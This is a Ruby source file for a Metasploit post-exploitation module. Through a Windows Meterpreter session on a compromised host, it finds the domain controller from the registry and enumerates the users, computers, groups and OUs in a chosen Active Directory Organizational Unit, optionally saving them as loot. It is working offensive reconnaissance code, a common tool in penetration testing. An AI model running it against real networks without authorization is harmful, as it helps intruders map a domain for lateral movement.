# encoding: UTF-8

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI

  def initialize(info = {})
    super(update_info(
          info,
          'Name'          => 'Windows Gather AD Enumerate Domain OU Membership',
          'Description'   => %q{ This Module will perform an ADSI query and enumerate
          all members of a Organizational Unit given its Distinguished Name on
          the domain the host is a member of through a Windows Meterpreter Session.},
          'License'       => BSD_LICENSE,
          'Author'        => 'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'Platform'      => 'win',
          'SessionTypes'  => 'meterpreter'
      ))
    register_options(
      [
        OptString.new('OU_DN', [true,
                                'Distinguished Name of a Organizational Unit to enumerate members.',
                                nil]),
        OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
        OptInt.new('MAX_SEARCH', [false, 'Maximum values to retrieve, 0 for all.', 100])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    if datastore['OU_DN'] =~ /^OU=*/
      # Make sure the extension is loaded.
      if load_extapi
        domain = get_domain
        unless domain.nil?

          table = Rex::Ui::Text::Table.new(
            'Indent' => 4,
            'SortIndex' => -1,
            'Width' => 80,
            'Columns' =>
            [
              'Name',
              'SAMAccount',
              'Distinguished Name',
              'Type'
            ]
          )

          filter =   '(|(&(objectCategory=person)(objectClass=user))(objectClass=computer)(objectClass=group)(objectClass=organizationalUnit))'
          query_result = session.extapi.adsi.domain_query(datastore['OU_DN'],
                                                          filter,
                                                          datastore['MAX_SEARCH'],
                                                          datastore['MAX_SEARCH'],
                                                          [
                                                            'name',
                                                            'samaccountname',
                                                            'distinguishedname',
                                                            'objectcategory']
                                                        )
          if query_result[:results].empty?
            print_status 'No results where found.'
            return
          end

          query_result[:results].each do |obj|

            # Identify the object type
            objtype = ''
            case obj[3][:value].to_s
            when /^CN=Person*/
              objtype = 'User'

            when /^CN=Computer/
              objtype = 'Computer'

            when /^CN=Group*/
              objtype = 'Group'

            when /^CN=Organizational-Unit*/
              objtype = 'OU'
            end

            table << [obj[0][:value], obj[1][:value], obj[2][:value], objtype]
          end
          table.print
          print_line

          if datastore['STORE_LOOT']
            stored_path = store_loot('ad.ou_members', 'text/plain', session, table.to_csv)
            print_status("Results saved to: #{stored_path}")
          end

        end
      end
    else
      print_error "Distinguished Name provided is not for an Organizational Unit."
    end
  end

  def get_domain
    domain = nil
    begin
      subkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History'
      v_name = 'DCName'
      domain_dc = registry_getvaldata(subkey, v_name)
    rescue
      print_error('Could not determine if the host is part of a domain.')
      return nil
    end
    if !domain_dc.nil?
      # Parse the information
      dom_info =  domain_dc.split('.')
      domain = dom_info[1].upcase
    else
      print_status 'Host is not part of a domain.'
    end
    domain
  end
end
